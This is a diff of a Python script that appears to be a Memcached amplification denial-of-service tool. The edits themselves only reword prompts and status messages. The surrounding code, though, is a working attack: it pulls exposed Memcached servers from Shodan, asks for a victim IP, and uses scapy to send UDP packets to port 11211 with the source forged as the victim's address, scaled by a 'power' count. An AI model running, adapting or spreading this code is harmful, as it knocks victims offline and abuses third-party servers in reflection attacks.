@@ -24,7 +24,7 @@ else:
     file = open('api.txt', 'w')
     SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
     file.write(SHODAN_API_KEY)
-    print('[~] File written: ./api.txt')
+    print('[+] File written: ./api.txt')
     file.close()
 
 while True:
@@ -32,34 +32,33 @@ while True:
     print('')
     try:
         myresults = Path("./bots.txt")
-        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
+        query = input("[*] Use Shodan API to search for affected Memcached servers? <y/n>: ").lower()
         if query.startswith('y'):
-            print('')
-            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
+            print('[*] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
             results = api.search('product:"Memcached" port:11211')
-            print('[✓] API Key Authentication: SUCCESS')
-            print('[~] Number of bots: %s' % results['total'])
-            print('')
-            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
+            print('[+] API Key Authentication: SUCCESS')
+            print('[*] Number of bots: %s' % results['total'])
+            saveresult = input("[*] Save results for later usage? <y/n>: ").lower()
             if saveresult.startswith('y'):
                 file2 = open('bots.txt', 'a')
                 for result in results['matches']:
                     file2.write(result['ip_str'] + "\n")
-                print('[~] File written: ./bots.txt')
-                print('')
+                print('[+] File written: ./bots.txt')
                 file2.close()
-        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
+                
+        saveme = input('[*] Would you like to use locally stored Shodan data? <y/n>: ').lower()
         if myresults.is_file():
             if saveme.startswith('y'):
                 with open('bots.txt') as my_file:
                     ip_array = [line.rstrip() for line in my_file]
+        
         else:
             print('\033[1;91m[!!] Error: \033[0mNo bots stored locally, bots.txt file not found!')
 
         if saveme.startswith('y') or query.startswith('y'):
-            target = input("[▸] Enter target IP address: ")
-            targetport = input("[▸] Enter target port number (Default 80): ") or "80"
-            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
+            target = input("[*] Enter target IP address: ")
+            targetport = input("[*] Enter target port number (Default 80): ") or "80"
+            power = int(input("[*] Enter preferred power (Default=1): ") or "1")
 
             data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
             if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
@@ -69,7 +68,7 @@ while True:
                 print("[+] Payload transformed: ", dataset)
 
             if query.startswith('y'):
-                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
+                iplist = input('[*] Would you like to display all the bots from Shodan? <y/n>: ').lower()
                 if iplist.startswith('y'):
 
                     counter= int(0)
@@ -78,8 +77,9 @@ while True:
                         counter=counter+1
                         print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                         time.sleep(1.1 - ((time.time() - starttime) % 1.1))
+                        
             if saveme.startswith('y'):
-                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
+                iplistlocal = input('[*] Would you like to display all the bots stored locally? <y/n>: ').lower()
                 if iplistlocal.startswith('y'):
 
                     counter= int(0)
@@ -99,14 +99,15 @@ while True:
                                 send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                 send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                         else:
-                            if power>1:
+                            if power > 1:
                                 print('[+] Sending %d forged UDP packets to: %s' % (power, i))
                                 with suppress_stdout():
                                     send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
-                            elif power==1:
+                            elif power == 1:
                                 print('[+] Sending 1 forged UDP packet to: %s' % i)
                                 with suppress_stdout():
                                     send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
+                
                 else:
                     for result in results['matches']:
                         if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
@@ -124,11 +125,11 @@ while True:
                                 with suppress_stdout():
                                     send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
 
-                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
+                print('[!] Task complete! Exiting Platform...')
                 break
             else:
                 print('\033[1;91m[!!] Error: \033[0m%s not engaged!' % target)
-                print('[*] Restarting Platform! Please wait.')
+                print('[*] Restarting Platform! Please wait...')
 
         else:
             print('\033[1;91m[!!] Error: \033[0mNo bots stored locally or remotely on Shodan!')
@@ -136,12 +137,12 @@ while True:
 
     except shodan.APIError as e:
             print('\033[1;91m[!!] Error: \033[0m%s' % e)
-            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
+            option = input('[*] Would you like to change API Key? <y/n>: ').lower()
             if option.startswith('y'):
                 file = open('api.txt', 'w')
                 SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                 file.write(SHODAN_API_KEY)
-                print('[~] File written: ./api.txt')
+                print('[+] File written: ./api.txt')
                 file.close()
                 print('[*] Restarting Platform! Please wait.')
 
